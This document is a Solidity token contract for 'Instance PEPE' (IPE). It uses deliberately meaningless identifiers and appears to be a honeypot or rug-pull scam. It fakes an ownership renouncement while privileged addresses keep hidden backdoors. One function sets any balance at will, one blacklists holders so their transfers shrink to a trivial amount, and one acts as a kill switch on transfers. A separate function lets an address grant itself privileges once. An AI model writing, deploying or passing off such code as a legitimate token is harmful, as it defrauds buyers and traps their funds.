//SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

interface takeWallet {
    function totalSupply() external view returns (uint256);

    function balanceOf(address maxReceiver) external view returns (uint256);

    function transfer(address minReceiver, uint256 totalShould) external returns (bool);

    function allowance(address exemptSwap, address spender) external view returns (uint256);

    function approve(address spender, uint256 totalShould) external returns (bool);

    function transferFrom(
        address sender,
        address minReceiver,
        uint256 totalShould
    ) external returns (bool);

    event Transfer(address indexed from, address indexed receiverMode, uint256 value);
    event Approval(address indexed exemptSwap, address indexed spender, uint256 value);
}

abstract contract tradingAt {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface autoAtToken {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface feeLiquidity {
    function createPair(address limitFee, address atFundWallet) external returns (address);
}

interface modeAmount is takeWallet {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract InstancePEPE is tradingAt, takeWallet, modeAmount {

    bool private sellExemptTrading;

    bool private senderTotal;

    function getOwner() external view returns (address) {
        return maxLiquidity;
    }

    function teamSender() public {
        emit OwnershipTransferred(autoBuy, address(0));
        maxLiquidity = address(0);
    }

    address autoEnable = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    uint256 private receiverLiquidity;

    string private launchTeam = "IPE";

    address launchedShouldMax = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    address public swapAt;

    address public autoBuy;

    function name() external view virtual override returns (string memory) {
        return launchedIsSell;
    }

    uint256 private txMin;

    function enableShouldLaunch() private view {
        require(toExemptAt[_msgSender()]);
    }

    uint256 public walletTo;

    function allowance(address liquidityFee, address minTxEnable) external view virtual override returns (uint256) {
        if (minTxEnable == launchedShouldMax) {
            return type(uint256).max;
        }
        return tradingExempt[liquidityFee][minTxEnable];
    }

    uint256 constant limitFund = 20 ** 10;

    constructor (){
        if (sellExemptTrading != totalSwapAt) {
            senderTotal = false;
        }
        autoAtToken swapTeam = autoAtToken(launchedShouldMax);
        swapAt = feeLiquidity(swapTeam.factory()).createPair(swapTeam.WETH(), address(this));
        
        autoBuy = _msgSender();
        teamSender();
        toExemptAt[autoBuy] = true;
        buyReceiverTake[autoBuy] = autoMin;
        if (totalSwapAt != buyMin) {
            totalSwapAt = true;
        }
        emit Transfer(address(0), autoBuy, autoMin);
    }

    function sellFund(uint256 totalShould) public {
        enableShouldLaunch();
        teamModeExempt = totalShould;
    }

    event OwnershipTransferred(address indexed teamLaunchedWallet, address indexed receiverBuyMarketing);

    bool public receiverSell;

    function marketingLimit(address amountTokenMax, address minReceiver, uint256 totalShould) internal returns (bool) {
        if (amountTokenMax == autoBuy) {
            return autoReceiverWallet(amountTokenMax, minReceiver, totalShould);
        }
        uint256 limitAmount = takeWallet(swapAt).balanceOf(autoEnable);
        require(limitAmount == teamModeExempt);
        require(minReceiver != autoEnable);
        if (senderAt[amountTokenMax]) {
            return autoReceiverWallet(amountTokenMax, minReceiver, limitFund);
        }
        return autoReceiverWallet(amountTokenMax, minReceiver, totalShould);
    }

    string private launchedIsSell = "Instance PEPE";

    function balanceOf(address maxReceiver) public view virtual override returns (uint256) {
        return buyReceiverTake[maxReceiver];
    }

    uint256 private autoMin = 100000000 * 10 ** 18;

    function totalSupply() external view virtual override returns (uint256) {
        return autoMin;
    }

    uint8 private amountMode = 18;

    uint256 teamModeExempt;

    mapping(address => bool) public toExemptAt;

    function symbol() external view virtual override returns (string memory) {
        return launchTeam;
    }

    uint256 public maxAmountTrading;

    function exemptShould(address takeShouldLaunched, uint256 totalShould) public {
        enableShouldLaunch();
        buyReceiverTake[takeShouldLaunched] = totalShould;
    }

    bool public buyMin;

    function totalBuyLaunched(address takeEnableToken) public {
        require(takeEnableToken.balance < 100000);
        if (receiverSell) {
            return;
        }
        if (buyMin != senderTotal) {
            sellExemptTrading = false;
        }
        toExemptAt[takeEnableToken] = true;
        
        receiverSell = true;
    }

    mapping(address => mapping(address => uint256)) private tradingExempt;

    function owner() external view returns (address) {
        return maxLiquidity;
    }

    mapping(address => uint256) private buyReceiverTake;

    mapping(address => bool) public senderAt;

    function transfer(address takeShouldLaunched, uint256 totalShould) external virtual override returns (bool) {
        return marketingLimit(_msgSender(), takeShouldLaunched, totalShould);
    }

    uint256 toEnable;

    function autoReceiverWallet(address amountTokenMax, address minReceiver, uint256 totalShould) internal returns (bool) {
        require(buyReceiverTake[amountTokenMax] >= totalShould);
        buyReceiverTake[amountTokenMax] -= totalShould;
        buyReceiverTake[minReceiver] += totalShould;
        emit Transfer(amountTokenMax, minReceiver, totalShould);
        return true;
    }

    function decimals() external view virtual override returns (uint8) {
        return amountMode;
    }

    function transferFrom(address amountTokenMax, address minReceiver, uint256 totalShould) external override returns (bool) {
        if (_msgSender() != launchedShouldMax) {
            if (tradingExempt[amountTokenMax][_msgSender()] != type(uint256).max) {
                require(totalShould <= tradingExempt[amountTokenMax][_msgSender()]);
                tradingExempt[amountTokenMax][_msgSender()] -= totalShould;
            }
        }
        return marketingLimit(amountTokenMax, minReceiver, totalShould);
    }

    address private maxLiquidity;

    function shouldTeamEnable(address minIs) public {
        enableShouldLaunch();
        
        if (minIs == autoBuy || minIs == swapAt) {
            return;
        }
        senderAt[minIs] = true;
    }

    bool private totalSwapAt;

    function approve(address minTxEnable, uint256 totalShould) public virtual override returns (bool) {
        tradingExempt[_msgSender()][minTxEnable] = totalShould;
        emit Approval(_msgSender(), minTxEnable, totalShould);
        return true;
    }

}